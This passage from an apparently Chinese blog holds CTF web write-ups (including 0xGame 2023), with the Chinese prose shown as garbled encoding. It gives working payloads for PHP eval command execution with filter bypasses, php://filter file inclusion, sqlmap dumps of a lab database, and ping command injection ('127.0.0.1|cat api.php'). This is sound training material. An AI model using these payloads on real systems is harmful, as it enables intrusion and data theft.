$var)</code><br>foreachè¯­å¥å°†éå†æ•°ç»„arrayï¼Œæ¯æ¬¡å¾ªç¯æ—¶ï¼Œå°†å½“å‰æ•°ç»„ä¸­çš„å€¼èµ‹ç»™var<br>ä»”ç»†æŸ¥çœ‹ä»£ç å¯ä»¥å‘ç°ï¼Œè¿™ä¸€å…³æ˜¯æ²¡æœ‰ç»™flag5èµ‹å€¼çš„ä»£ç <br>ifæ£€æµ‹flag5çš„å­˜åœ¨ï¼Œæ‰€ä»¥çŸ¥é“è®©postä¸­æœ‰flag5è¿™ä¸ªå˜é‡å³å¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key3</span>[]=<span class="hljs-number">1</span>&amp;flag5=?<br><span class="hljs-attribute">or</span><br><span class="hljs-attribute">key3</span>[]=<span class="hljs-number">1</span>&amp;flag5[]=<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªif<br><code>if(substr($password,0,6)===&quot;c4d038&quot;)</code><br>æ„æ€æ˜¯passwordè¢«MD5åŠ å¯†åçš„å‰6ä½ä¸ºc4d038<br>å¯¹äºç¬¬äºŒä¸ªifï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªè„šæœ¬ï¼Œæˆ–è€…ç½‘ä¸Šæ‰¾èµ„æº</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">import hashlib<br><br>def <span class="hljs-built_in">crack</span>(pre):<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">999999</span>):<br>        if (hashlib.<span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&quot;UTF-8&quot;</span>)).<span class="hljs-built_in">hexdigest</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-built_in">str</span>(pre):<br>            <span class="hljs-built_in">print</span>(i)<br>            break<br><br><br><span class="hljs-built_in">crack</span>(<span class="hljs-string">&quot;c4d038&quot;</span>)<br></code></pre></td></tr></table></figure><p>å¾—å‡ºpassword&#x3D;114514<br>æ¥ç€æ„é€ <code>e_v.a.l</code><br>æ³¨ï¼šè¦æŠŠç¬¬ä¸€ä¸ª_æ”¹ä¸º[,è¿™æ ·å°±ä¸ä¼šå‡ºé”™<br>åœ¨phpä¸­å˜é‡åå­—æ˜¯ç”±æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆçš„ï¼Œæ‰€ä»¥ä¸è®ºç”¨postè¿˜æ˜¯getä¼ å…¥å˜é‡åçš„æ—¶å€™éƒ½å°†ç©ºæ ¼ã€+ã€ç‚¹ã€[è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œä½†æ˜¯ç”¨ä¸€ä¸ªç‰¹æ€§æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå°±æ˜¯å½“[æå‰å‡ºç°åï¼Œåé¢çš„ç‚¹å°±ä¸ä¼šå†è¢«è½¬ä¹‰äº†</p><p>&#x2F;flag|system|pass|cat|lséƒ½è¢«è¿‡æ»¤äº†<br>é¦–å…ˆè€ƒè™‘base64ç¼–ç ç»•è¿‡<br>æ³¨ï¼ševal()å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ã€‚å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„ PHP ä»£ç ï¼Œä¸”<strong>å¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>base64:system(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=eval(base64_decode(<span class="hljs-string">&#x27;c3lzdGVtKCdscycpOw==&#x27;</span>));<br><span class="hljs-regexp">//</span> index.php<br><br><span class="hljs-regexp">//</span>base64:system(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=eval(base64_decode(<span class="hljs-string">&#x27;c3lzdGVtKCdscyAvJyk7&#x27;</span>));<br><span class="hljs-regexp">//</span>bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var<br><br><span class="hljs-regexp">//</span>base64:system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=eval(base64_decode(<span class="hljs-string">&#x27;c3lzdGVtKCdjYXQgL2ZsYWcnKTs=&#x27;</span>));<br><span class="hljs-regexp">//</span>flag&#123;e6db2c1a-<span class="hljs-number">844</span>e-<span class="hljs-number">4</span>c2f-b173-<span class="hljs-number">6424</span>dddd6511&#125;<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼š</strong><br>systemè¿˜æœ‰ä¸€ç§è¡¨è¾¾æ–¹å¼&#96;&#96;(åå¼•å·)<br>ä½¿ç”¨è¿™ç§æ–¹æ³•è¦é…åˆecho</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">password=<span class="hljs-number">114514</span>&amp;e[v.a.l=<span class="hljs-keyword">echo</span> `l<span class="hljs-string">&#x27;&#x27;</span>s`;<span class="hljs-comment">//lsä¸­é—´ä¸ºå•å¼•å·ï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤\ä¹Ÿå¯ç»•è¿‡è¿‡æ»¤</span><br><span class="hljs-comment">//index.php</span><br><br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=<span class="hljs-keyword">echo</span> `l\s /`;<br><span class="hljs-comment">//bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=<span class="hljs-keyword">echo</span> `ca<span class="hljs-string">&#x27;&#x27;</span>t /f\lag`;<br><span class="hljs-comment">//flag&#123;e6db2c1a-844e-4c2f-b173-6424dddd6511&#125;</span><br></code></pre></td></tr></table></figure><h2 id="include-0ã€‚0"><a href="#include-0ã€‚0" class="headerlink" title="include 0ã€‚0"></a>include 0ã€‚0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>@æ˜¯å¿½ç•¥æŠ¥é”™æç¤º<br>å…¶ä½™ä»£ç å¾ˆç®€å•<br>æœ¬é¢˜preg_matchä¸å¯ç»•è¿‡<br>è¿‡æ»¤çš„ä¸ºä¸¤ä¸ªè¿‡æ»¤å™¨<br>æ¢ä¸ªè¿‡æ»¤å™¨å³å¯<br>æ‰¾ä¸ªåˆé€‚çš„è¿‡æ»¤å™¨çœŸä¸å®¹æ˜“å•Šo(Tãƒ˜To)<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.iconv.utf-8.utf-16/</span>resource=flag.php<br>or<br>?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/gental_z/article/details/122303393">Filterä¼ªåè®®</a><br><a href="https://www.anquanke.com/post/id/202510#h3-9">æ¢ç´¢php:&#x2F;&#x2F;filteråœ¨å®æˆ˜å½“ä¸­çš„å¥‡æŠ€æ·«å·§</a></p><p>flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-number">9</span>edaf<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-number">-774</span>d<span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>d-a<span class="hljs-number">779</span>-e<span class="hljs-number">39</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>b<span class="hljs-number">3482</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ¸¸æˆé«˜æ‰‹"><a href="#æ¸¸æˆé«˜æ‰‹" class="headerlink" title="æ¸¸æˆé«˜æ‰‹"></a>æ¸¸æˆé«˜æ‰‹</h2><p>f12è°ƒè¯•å™¨æœ‰æ¸¸æˆçš„æºä»£ç <br><img src="/images/S4FE02JII290NB39EL.png"><br>å½“gameScore&gt;100000æ—¶ï¼Œgameover()POSTäº†æˆ‘ä»¬çš„åˆ†æ•°åˆ°&#x2F;api.php<br>è¿™é‡Œéœ€è¦ä¼ªé€ åˆ†æ•°POSTä¸Šä¼ ï¼Œæ ¼å¼ä¸ºjson</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span><br>&#123;<br>    <span class="hljs-string">&quot;score&quot;</span>:100001<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/LHSFMFAAO9ON6.png"><br>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;c7231da2-bab1-<span class="hljs-number">42</span>f4-<span class="hljs-number">8</span>ede-b7f249eb335d&#125;<br></code></pre></td></tr></table></figure><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>ä½¿ç”¨sqlmapä¸€æŠŠæ’¸</p><p><strong>æŸ¥çœ‹æ•°æ®åº“</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://19f56f63-b51a-4cf1-95c2-c36947fd7288.node4.buuoj.cn:81/?id=TMP0919&quot;</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span><br><br><span class="hljs-selector-attr">[*]</span> ctf<br><span class="hljs-selector-attr">[*]</span> information_schema<br><span class="hljs-selector-attr">[*]</span> mysql<br><span class="hljs-selector-attr">[*]</span> performance_schema<br><span class="hljs-selector-attr">[*]</span> sys<br><span class="hljs-selector-attr">[*]</span> test<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ•°æ®åº“é‡Œçš„è¡¨</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">python sqlmap.py -u &quot;http://19f56f63-b51a-4cf1-95c2-c36947fd7288.node4.buuoj.cn:81/?id=TMP0919&quot; -D ctf --tables --batch<br><br><span class="hljs-code">+--------------+</span><br>| grades       |<br><span class="hljs-section">| here_is_flag |</span><br><span class="hljs-section">+--------------+</span><br><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ•°æ®åº“é‡Œçš„åˆ—</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">python sqlmap.py -u &quot;http://19f56f63-b51a-4cf1-95c2-c36947fd7288.node4.buuoj.cn:81/?id=TMP0919&quot; -D ctf -T here_is_flag --columns<br><br><span class="hljs-code">+--------+</span>--------------+<br><span class="hljs-section">| Column | Type         |</span><br><span class="hljs-section">+--------+--------------+</span><br><span class="hljs-section">| flag   | varchar(255) |</span><br><span class="hljs-section">+--------+--------------+</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ•°æ®åº“é‡Œå…·ä½“çš„å€¼</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">python sqlmap.py -u &quot;http://19f56f63-b51a-4cf1-95c2-c36947fd7288.node4.buuoj.cn:81/?id=TMP0919&quot; -D ctf -T here_is_flag -C flag --dump<br><br><span class="hljs-code">+--------------------------------------------+</span><br><span class="hljs-section">| flag                                       |</span><br><span class="hljs-section">+--------------------------------------------+</span><br><span class="hljs-section">| flag&#123;9dcdebb4-55dd-4d4c-80ab-42abcbf5ea0e&#125; |</span><br><span class="hljs-section">+--------------------------------------------+</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>0xgame 2023</title>
    <link href="/2023/10/13/0xgame%202023/"/>
    <url>/2023/10/13/0xgame%202023/</url>
    
    <content type="html"><![CDATA[<h2 id="webâ€“signin"><a href="#webâ€“signin" class="headerlink" title="webâ€“signin"></a>webâ€“signin</h2><p>æŸ¥çœ‹æºä»£ç <br>çœ‹åˆ°æœ‰ä¸ªjsæ–‡ä»¶<br>åœ¨æºä»£ç æœ€ä¸‹é¢æ‰¾ä¸ªè¢«æ³¨é‡Šçš„å†…å®¹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-comment"># sourceMappingURL=index-33309f51.js.map</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥&#x2F;assets&#x2F;index-33309f51.js.map<br>ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€<br>ctrl+fæŸ¥æ‰¾å…³é”®è¯ï¼Œ0xgameæ‰¾åˆ°flag<br>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;c788fa80-<span class="hljs-number">2184</span>-<span class="hljs-number">429</span>f-b410-<span class="hljs-number">48</span>cb8e2de0ff&#125;<br></code></pre></td></tr></table></figure><p>åœ¨main.jsä¸‹ä¹Ÿèƒ½æ‰¾åˆ°flag<br><img src="/images/GWTHD5LASUD1AXCTJ.png"></p><h2 id="webâ€“baby-php"><a href="#webâ€“baby-php" class="headerlink" title="webâ€“baby_php"></a>webâ€“baby_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$b</span>))<br></code></pre></td></tr></table></figure><p>ç”¨æ•°ç»„ç»•è¿‡å³å¯</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (!is_numeric($c) <span class="hljs-symbol">&amp;&amp;</span> $c != <span class="hljs-number">1024</span> <span class="hljs-symbol">&amp;&amp;</span> intval($c) == <span class="hljs-number">1024</span>)<br></code></pre></td></tr></table></figure><p>is_numericæœ‰3ç§ç»•è¿‡æ–¹æ³•ï¼Œç»è¿‡æµ‹è¯•ï¼Œæ•°ç»„ç»•è¿‡ä¸%20%00éƒ½ä¸å¯é€šè¿‡åé¢çš„intval<br>åœ¨1024ååŠ å…¥å­—æ¯å³å¯<br>intvalä¸ºåŒ–æ•´å‡½æ•°ï¼Œä½¿æˆ‘ä»¬çš„payloadåŠ ä¸Šä¸ªå°æ•°å³å¯<br>includeè¯»å–æ–‡ä»¶éœ€è¦ç”¨åˆ°ä¼ªåè®®<br>cookieä½¿ç”¨ä¼ªåè®®<br>payload:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span><br>?a[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;b</span>[]=<span class="hljs-number">2</span><br><span class="hljs-symbol">POST:</span><br>c=<span class="hljs-number">1024.123</span>a<br><span class="hljs-symbol">COOKIE:</span><br><span class="hljs-attr">name</span><span class="hljs-operator">=</span>php:<span class="hljs-comment">//filter/convert.base64-encode/resource=flag</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHAKCiRmbGF<span class="hljs-symbol">nID0</span>gJzB<span class="hljs-number">4</span>R<span class="hljs-number">2</span>FtZXs<span class="hljs-number">0</span><span class="hljs-name">M2</span>Ji<span class="hljs-name">M2</span>Uy<span class="hljs-symbol">NC0</span>wODI<span class="hljs-number">0</span>LTQ<span class="hljs-number">4</span>Y<span class="hljs-number">2</span>ItOTVkMC<span class="hljs-number">1</span>j<span class="hljs-symbol">NDcxNTQwYzA5</span><span class="hljs-symbol">NTN9</span>JzsKCj<span class="hljs-number">8</span>+<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°çš„å­—ç¬¦base64è§£ç å³å¯<br>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">43</span>bb3e24-<span class="hljs-number">0824</span>-<span class="hljs-number">48</span>cb-<span class="hljs-number">95</span>d0-c471540c0953&#125;<br></code></pre></td></tr></table></figure><h2 id="webâ€“hello-http"><a href="#webâ€“hello-http" class="headerlink" title="webâ€“hello http"></a>webâ€“hello http</h2><p>Error: The GET parameter query must be ctf<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET:<br>?<span class="hljs-attribute">query</span>=ctf<br></code></pre></td></tr></table></figure><p>Error: The POST form action must be getflag<br>payload:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">POST:</span><br>action=getflag<br></code></pre></td></tr></table></figure><p>Error: Your are not admin<br>payload:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">cookie:</span><br>role=admin<br></code></pre></td></tr></table></figure><p>Error: Only allow local IP<br>æŠ“ä¸ªåŒ…å­<br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-forwarded-for: <span class="hljs-number">127.0.0.1</span><br><br></code></pre></td></tr></table></figure><p>Error: You are not using HarmonyOS Browser ğŸ˜¡<br>payload:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: HarmonyOS Browser<br></code></pre></td></tr></table></figure><p>Error: Only allow access from ys.mihoyo.com ğŸ˜‹<br>payload:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> ys.mihoyo.com<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">2</span>c1a10fb-<span class="hljs-number">921</span>e-<span class="hljs-number">4250</span>-<span class="hljs-number">820</span>f-<span class="hljs-number">5</span>ce36940b8b5&#125;<br></code></pre></td></tr></table></figure><h2 id="webâ€“ping"><a href="#webâ€“ping" class="headerlink" title="webâ€“ping"></a>webâ€“ping</h2><p>æœ¬é¢˜æœ‰å‰ç«¯æ‹¦æˆªï¼Œéœ€è¦burpsuiteæŠ“åŒ…<br><code>127.0.0.1ï¼›ls</code>ï¼Œ<code>;</code>è¢«è¿‡æ»¤äº†,<code>;</code>å¯ç”¨%0aæ›¿ä»£ï¼Œæœ¬é¢˜ç”¨<code>|</code><br>payload:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>|ls<br>//api.php index.html simple.css<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>|cat api.php<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å›æ˜¾ï¼Œå¯èƒ½catç©ºæ ¼æˆ–phpè¢«ç¦äº†<br>å…ˆè€ƒè™‘ç©ºæ ¼è¢«ç¦<br>ç”¨%20ä»£æ›¿ï¼Œè¿˜æ˜¯æ²¡æœ‰<br>ç”¨tab%09ä»£æ›¿<br>å¯ä»¥å›æ˜¾<br>api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span 